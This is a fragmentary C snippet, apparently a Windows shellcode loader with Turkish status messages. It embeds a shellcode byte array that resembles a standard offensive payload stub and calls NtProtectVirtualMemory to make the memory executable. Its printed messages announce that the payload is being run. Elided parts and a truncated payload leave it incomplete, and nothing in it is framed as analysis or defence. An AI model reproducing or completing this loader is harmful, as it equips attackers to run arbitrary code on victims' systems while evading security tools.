...
int main() {
	...
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
    ...
    if (writeStatus == 0)
    {
        printf("[+] Basarili! Bellek adresi: %p\n", baseAddr);
        ULONG oldProtect = 0; 
        NTSTATUS protectStatus = NtProtectVirtualMemory(
            (HANDLE)-1,
            &baseAddr,
            &regionSize,
            PAGE_EXECUTE_READ,
        ...
        if (protectStatus == 0)
        {
            printf("[+] Koruma degistirildi! Calistiriliyor...\n");
